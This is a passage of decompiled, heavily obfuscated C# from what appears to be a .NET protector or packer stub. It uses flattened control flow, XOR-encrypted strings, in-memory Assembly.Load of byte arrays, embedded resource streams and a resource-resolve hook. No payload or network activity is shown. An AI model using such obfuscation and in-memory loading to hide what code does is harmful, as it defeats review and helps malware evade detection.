                  num1 = (byte) 8 == numArray[index] ? 33 : 22;
                  continue;
                case 18:
                  goto label_20;
                case 19:
                  goto label_25;
                case 20:
                  ++index;
                  num1 = 5;
                  continue;
                case 22:
                  Ⴗ.Ⴗ.Ⴀ();
                  num1 = 33;
                  continue;
                case 23:
                  num1 = (byte) 186 == numArray[index] ? 20 : 30;
                  continue;
                case 24:
                  int num2 = (int) Ⴗ.Ⴗ.Ⴄ();
                  num1 = 12;
                  continue;
                case 25:
                  goto label_44;
                case 26:
                  ++index;
                  num1 = 16;
                  continue;
                case 27:
                  goto label_43;
                case 28:
                  num1 = (byte) 103 == numArray[index] ? 34 : 0;
                  continue;
                case 29:
                  num1 = numArray[index] < (byte) 206 ? 25 : 15;
                  continue;
                case 30:
                  Ⴗ.Ⴐ.Ⴅ();
                  num1 = 20;
                  continue;
                case 31:
                case 33:
                  ++index;
                  num1 = 29;
                  continue;
                case 32:
                  Ⴗ.Ⴐ.Ⴄ();
                  num1 = 10;
                  continue;
                case 34:
                  ++index;
                  num1 = 7;
                  continue;
                case 35:
                  num1 = (byte) 13 == numArray[index] ? 26 : 2;
                  continue;
                case 36:
                  goto label_35;
                case 37:
                  Ⴗ.Ⴗ.Ⴈ();
                  num1 = 14;
                  continue;
                case 39:
                  goto label_5;
                case 40:
                  goto label_15;
                case 41:
                  num1 = numArray[index] < (byte) 13 ? 40 : 35;
                  continue;
                case 42:
                  num1 = numArray[index] < (byte) 103 ? 13 : 28;
                  continue;
                default:
                  goto label_4;
              }
            }
label_10:
            return;
label_30:
            return;
label_20:
            return;
label_25:
            return;
label_44:
            return;
label_35:
            return;
label_15:
            return;
label_4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႣ);
            return;
label_43:
            int num3 = index + 1;
            return;
          }
          goto case 0;
      }
    }

    internal static object ႨႳ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 61:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
          case 3:
          case 5:
            goto label_8;
          case 6:
            num2 = 0;
            continue;
          case 7:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႳ);
            num2 = 0;
            continue;
        }
      }
label_8:
      object obj = obj0.GetObject(obj1);
      Ⴗ.Ⴐ.ႭႳ();
      return obj;
    }

    internal static void ႨႷ([In] ResourceManager obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_8;
          case 2:
            goto label_7;
          case 4:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 62:
                num2 = 2;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.ReleaseAllResources();
label_8:
      Ⴗ.Ⴐ.ႨႣ();
    }

    internal static Encoding ႨႼ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 6:
          num1 = 5;
          break;
        case 7:
          num1 = 4;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 7;
            continue;
          case 1:
          case 2:
          case 5:
          case 6:
            goto label_9;
          case 3:
            num2 = 7;
            continue;
          case 4:
            goto label_10;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႼ);
            num2 = 7;
            continue;
        }
      }
label_9:
      Encoding encoding = Encoding.Default;
      Ⴗ.Ⴐ.ႭႠ();
      return encoding;
label_10:
      return Encoding.ASCII;
    }

    internal static byte[] ႭႤ([In] Encoding obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 119:
          num1 = 6;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
            num2 = 2;
            continue;
          case 2:
          case 3:
            goto label_3;
          case 5:
            num2 = 2;
            continue;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႤ);
            num2 = 2;
            continue;
        }
      }
label_8:
      byte[] bytes = obj0.GetBytes(obj1);
      Ⴗ.Ⴗ.Ⴓ();
      return bytes;
    }

    internal static Assembly ႭႨ([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 47:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 2;
            continue;
          case 2:
          case 5:
            goto label_3;
          case 3:
          case 4:
            goto label_8;
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႨ);
            num2 = 2;
            continue;
        }
      }
label_8:
      Assembly assembly = Assembly.Load(obj0);
      Ⴗ.Ⴐ.ႭႤ();
      return assembly;
    }

    internal static Type[] ႭႭ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 31:
          num1 = 1;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_8;
          case 2:
          case 7:
            goto label_3;
          case 3:
            num2 = 2;
            continue;
          case 4:
          case 5:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႭ);
            num2 = 2;
            continue;
        }
      }
label_8:
      Type[] types = obj0.GetTypes();
      Ⴗ.Ⴐ.ႨႭ();
      return types;
    }

    internal static string ႭႥ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 5:
          num1 = 1;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 4:
            num2 = 5;
            continue;
          case 1:
            goto label_8;
          case 3:
            num2 = 5;
            continue;
          case 5:
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႥ);
            num2 = 5;
            continue;
        }
      }
label_8:
      string location = obj0.Location;
      Ⴗ.Ⴐ.ႨႨ();
      return location;
    }

    internal static string ႭႰ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 20:
          num1 = 5;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
          case 7:
            num2 = 1;
            continue;
          case 3:
            num2 = 1;
            continue;
          case 4:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႰ);
            num2 = 1;
            continue;
        }
      }
label_8:
      string str = obj0.ToString() + obj1;
      Ⴗ.Ⴐ.ႨႠ();
      return str;
    }

    internal static object ႭႠ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 101:
          num1 = 2;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            num2 = 7;
            continue;
          case 2:
            goto label_8;
          case 4:
          case 6:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႠ);
            num2 = 7;
            continue;
        }
      }
label_8:
      object data = obj0.GetData(obj1);
      Ⴗ.Ⴗ.ႨႤ();
      return data;
    }

    internal static void ႭႣ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
          case 5:
            num1 = 4;
            continue;
          case 2:
          case 3:
            goto label_8;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 24:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.SetData(obj1, obj2);
label_8:
      Ⴗ.Ⴗ.ႨႨ();
    }

    internal static Stream ႭႳ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 38:
          num1 = 1;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 3:
            goto label_8;
          case 5:
            goto label_3;
          case 6:
            num2 = 5;
            continue;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႳ);
            num2 = 5;
            continue;
        }
      }
label_8:
      Stream manifestResourceStream = obj0.GetManifestResourceStream(obj1);
      Ⴗ.Ⴗ.ႨႠ();
      return manifestResourceStream;
    }

    internal static long ႭႷ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 28:
          num1 = 2;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
            goto label_3;
          case 2:
            goto label_8;
          case 5:
          case 7:
            num2 = 4;
            continue;
          case 6:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႷ);
            num2 = 4;
            continue;
        }
      }
label_8:
      long length = obj0.Length;
      Ⴗ.Ⴐ.ႨႳ();
      return length;
    }

    internal static int ႭႼ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 118:
          num1 = 4;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_8;
          case 1:
          case 2:
          case 6:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႭႼ);
            num2 = 5;
            continue;
        }
      }
label_8:
      int num3 = obj0.ReadByte();
      Ⴗ.Ⴐ.ႭႷ();
      return num3;
    }

    internal static Assembly ႥႤ(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] Evidence obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 1:
          num1 = 5;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 7:
            num2 = 4;
            continue;
          case 2:
          case 6:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႥႤ);
            num2 = 4;
            continue;
        }
      }
label_8:
      Assembly assembly = Assembly.Load(obj0, obj1, obj2);
      Ⴗ.Ⴐ.ႨႭ();
      return assembly;
    }

    internal static void ႥႭ()
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_4;
          default:
            if (!Ⴗ.Ⴗ.ႥႨ)
            {
              num1 = 0;
              continue;
            }
            goto label_9;
        }
      }
label_9:
      return;
label_4:
      lock (typeof (Ⴗ.Ⴗ))
      {
        int num2 = 4;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_11;
            case 3:
              Ⴗ.Ⴗ.ႥႨ = true;
              Ⴗ.Ⴗ.ႥႥ();
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴗ.Ⴗ.ႥႰ);
              num2 = 1;
              continue;
            default:
              num2 = Ⴗ.Ⴗ.ႥႨ ? 1 : 3;
              continue;
          }
        }
      }
label_11:
      int num3 = 5;
      while (true)
      {
        switch (num3)
        {
          case 2:
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႥႭ);
            num3 = 3;
            continue;
          case 3:
            goto label_15;
          default:
            num3 = 3;
            continue;
        }
      }
label_15:;
    }

    internal static object ႥႥ()
    {
label_3:
      byte[] bytes = BitConverter.GetBytes(DateTime.UtcNow.Ticks);
      AppDomain.CurrentDomain.SetData("54b3465c638347559230d7313c7294c3", (object) bytes);
      int num = !BitConverter.IsLittleEndian ? 0 : 6;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            goto label_5;
          case 2:
          case 3:
            goto label_3;
          case 5:
          case 6:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႥႥ);
            num = 2;
            continue;
        }
      }
label_4:
      Array.Reverse((Array) bytes);
label_5:
      return (object) null;
    }

    internal static string ႥႠ([In] int obj0)
    {
      int index1 = obj0 ^ 1752227528;
      string str1;
      if ((str1 = Ⴗ.Ⴗ.ႥႳ[index1]) != null)
        return str1;
      string str2;
      switch (index1)
      {
        case 0:
          str2 = "࠸≽╎ጿ㖮᨞ᨎ㇚࠻≺└ጿ㖮᨟ᨎㆌ࠴≻┟ጼ㗾᨟ᨈㆈ࠾∪┛ጾ㖣\u1A1Cᩘㆊ";
          break;
        default:
          str2 = (string) null;
          break;
      }
      string str3 = str2;
      int length1;
      char[] chArray = new char[length1 = str3.Length];
      char[] ⴅⴃ = Ⴗ.Ⴗ.ႥႣ;
      int length2 = ⴅⴃ.Length;
      for (int index2 = 0; index2 < length1; index2 = 1 + index2)
        chArray[index2] = (char) ((uint) str3[index2] ^ (uint) ⴅⴃ[(index2 + obj0) % length2]);
      string str4 = new string(chArray);
      Ⴗ.Ⴗ.ႥႳ[index1] = str4;
      return str4;
    }

    internal static AppDomain ႥႷ([In] int obj0, [In] int obj1)
    {
label_0:
      switch ((obj1 ^ obj0) - 70)
      {
        case 0:
          return AppDomain.CurrentDomain;
        case 1:
          return AppDomain.CurrentDomain;
        case 2:
          return AppDomain.CurrentDomain;
        case 3:
          return AppDomain.CurrentDomain;
        case 4:
          return AppDomain.CurrentDomain;
        case 5:
          return AppDomain.CurrentDomain;
        case 6:
          return AppDomain.CurrentDomain;
        case 7:
          return AppDomain.CurrentDomain;
        case 8:
          return AppDomain.CurrentDomain;
        case 9:
          return AppDomain.CurrentDomain;
        case 10:
          return AppDomain.CurrentDomain;
        case 11:
          return AppDomain.CurrentDomain;
        case 12:
          return AppDomain.CurrentDomain;
        case 13:
          return AppDomain.CurrentDomain;
        case 14:
          return AppDomain.CurrentDomain;
        case 15:
          return AppDomain.CurrentDomain;
        case 16:
          return AppDomain.CurrentDomain;
        case 17:
          return AppDomain.CurrentDomain;
        case 18:
          return AppDomain.CurrentDomain;
        case 19:
          return AppDomain.CurrentDomain;
        case 20:
          return AppDomain.CurrentDomain;
        case 21:
          return AppDomain.CurrentDomain;
        case 22:
          return AppDomain.CurrentDomain;
        case 23:
          return AppDomain.CurrentDomain;
        case 24:
          return AppDomain.CurrentDomain;
        case 25:
          return AppDomain.CurrentDomain;
        case 26:
          return AppDomain.CurrentDomain;
        case 27:
          return AppDomain.CurrentDomain;
        case 28:
          return AppDomain.CurrentDomain;
        case 29:
          return AppDomain.CurrentDomain;
        case 30:
          return AppDomain.CurrentDomain;
        case 31:
          return AppDomain.CurrentDomain;
        case 32:
          return AppDomain.CurrentDomain;
        case 33:
          return AppDomain.CurrentDomain;
        case 34:
          return AppDomain.CurrentDomain;
        case 35:
          return AppDomain.CurrentDomain;
        case 36:
          return AppDomain.CurrentDomain;
        case 37:
          return AppDomain.CurrentDomain;
        case 38:
          return AppDomain.CurrentDomain;
        case 39:
          return AppDomain.CurrentDomain;
        default:
          goto label_0;
      }
    }

    internal static void ႥႼ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
label_0:
      switch ((obj4 ^ obj3) - 78)
      {
        case 0:
          obj0.SetData(obj1, obj2);
          break;
        case 1:
          obj0.SetData(obj1, obj2);
          break;
        case 2:
          obj0.SetData(obj1, obj2);
          break;
        case 3:
          obj0.SetData(obj1, obj2);
          break;
        case 4:
          obj0.SetData(obj1, obj2);
          break;
        case 5:
          obj0.SetData(obj1, obj2);
          break;
        case 6:
          obj0.SetData(obj1, obj2);
          break;
        case 7:
          obj0.SetData(obj1, obj2);
          break;
        default:
          goto label_0;
      }
    }
  }
}
